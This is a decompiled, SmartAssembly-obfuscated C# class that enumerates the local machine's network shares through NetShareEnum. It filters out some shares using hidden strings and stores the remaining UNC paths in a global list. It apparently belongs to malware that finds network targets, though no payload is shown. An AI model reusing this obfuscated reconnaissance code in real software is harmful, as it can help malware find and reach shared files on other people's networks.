using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wmzoZRdMaf;

public sealed class fHaTkPBbBXJG
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ZrfrkAMRwjAZ
	{
		public string GpHSGHbTRxDI;

		public uint SMNGogTEOPXWcR;

		public string UPvxZZrfZXp;

		public ZrfrkAMRwjAZ(string string_0, uint uint_0, string string_1)
		{
			GpHSGHbTRxDI = string_0;
			SMNGogTEOPXWcR = uint_0;
			UPvxZZrfZXp = string_1;
		}

		public override string ToString()
		{
			return GpHSGHbTRxDI;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public ZrfrkAMRwjAZ[] TegFGfXeXVHs(string string_0)
	{
		List<ZrfrkAMRwjAZ> list = new List<ZrfrkAMRwjAZ>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(ZrfrkAMRwjAZ));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				ZrfrkAMRwjAZ item = (ZrfrkAMRwjAZ)Marshal.PtrToStructure(ptr, typeof(ZrfrkAMRwjAZ));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new ZrfrkAMRwjAZ(getString_0(107401768) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void rJgGHLLcLwlpT()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			ZrfrkAMRwjAZ[] array = new fHaTkPBbBXJG().TegFGfXeXVHs(Environment.MachineName);
			ZrfrkAMRwjAZ[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				ZrfrkAMRwjAZ zrfrkAMRwjAZ = array2[i];
				if (zrfrkAMRwjAZ.ToString().Contains(getString_0(107400317)) || zrfrkAMRwjAZ.ToString().Contains(getString_0(107400340)) || zrfrkAMRwjAZ.ToString().Contains(getString_0(107400299)) || zrfrkAMRwjAZ.ToString().Contains(getString_0(107390700)) || logicalDrives.Contains(zrfrkAMRwjAZ.ToString().Replace(getString_0(107405217), getString_0(107400290))))
				{
					continue;
				}
				if (!IuKjJmfJcVBFA.SCtDlgPmJoxb.Contains(getString_0(107390687) + Environment.MachineName + getString_0(107396961) + zrfrkAMRwjAZ))
				{
					IuKjJmfJcVBFA.SCtDlgPmJoxb.Add(getString_0(107390687) + Environment.MachineName + getString_0(107396961) + zrfrkAMRwjAZ);
				}
				if (IuKjJmfJcVBFA.COsiatrWvUa)
				{
					try
					{
						Console.WriteLine(getString_0(107400285), getString_0(107390687) + Environment.MachineName + getString_0(107396961) + zrfrkAMRwjAZ);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (IuKjJmfJcVBFA.JkprrzFPchvjDH)
			{
				try
				{
					File.AppendAllText(IuKjJmfJcVBFA.AIOBtLgIwjoLs, getString_0(107400260) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static fHaTkPBbBXJG()
	{
		Strings.CreateGetStringDelegate(typeof(fHaTkPBbBXJG));
	}
}
